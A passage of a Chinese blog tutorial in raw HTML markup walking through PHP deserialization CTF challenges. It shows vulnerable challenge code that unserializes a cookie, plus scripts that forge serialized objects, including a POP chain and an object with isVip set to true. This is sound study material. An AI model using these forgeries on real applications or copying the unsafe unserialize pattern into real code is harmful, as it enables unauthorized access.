punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>传值给pop参数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545509.png\" alt=\"在这里插入图片描述\"><br>base64解码得flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545668.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"简单类型（读懂代码）\"><a href=\"#简单类型（读懂代码）\" class=\"headerlink\" title=\"简单类型（读懂代码）\"></a>简单类型（读懂代码）</h2><h3 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话没有涉及魔术方法，魔术方法指的是以_开头的，然后我们先不看类，先看它执行的代码，也就是这一部分</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//实例化类</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//login方法调用传入的变量user</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这一部分的话可以看出是get传入username和password，然后有一个条件语句，当得到username和password变量时往下执行，此时实例化了类，然后依次用三种方法调用了传入的变量user，此时我们再看上面的类</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//公共变量，设置username为xxxxxx</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置password为xxxxxx</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置isvip为false</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 定义属性</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token comment\">//如果传入的username变量与password变量和$username与$password相同</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//就将isvip改为true</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>因此此时的话我们就按要求，传入username和password都等于xxxxxx，即可使得isvip为true，此时的话就会执行checkvip，然后checkvip是得到这个isvip的值，然后是true，此时就再往下执行，进入这个<code>vipOneKeyGetFlag</code>方法，然后里面的是有这样一个检测<code>if($this-&gt;isVip)</code>，因为isvip是true，所以就往下执行，这时候就输出了flag，因此我们的payload就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">username<span class=\"token operator\">=</span>xxxxxx<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>xxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话我们就可以看出对user进行了一次反序列化，然后这个当username和password匹配成功时不会更改isvip为true，这时候我们就可以本地来更改它这个值，然后实例化这个类，引用Y4师傅的话来解释反序列化和序列化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">序列化将对象保存到字符串，反序列化将字符串恢复为对象<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n<p>然后我们本地得到序列化的时候需要进行url编码，具体如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后此时就可以得到它实例化类的值，它这个user是由cookie里的user得到的，因此我们新添一个cookie为user，且值为我们刚刚得到的值即可通过第一层检测<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545785.png\" alt=\"在这里插入图片描述\"><br>然后第二次检测的话是要求值和设定的相同，所以这时候就需要我们传入的username和password为xxxxxx了，所以我们此时构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">username<span class=\"token operator\">=</span>xxxxxx<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>xxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>进行传入即可<br>不理解的话可以进行本地测试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看此时它构造的语句，可以往下执行，得到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545015.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string 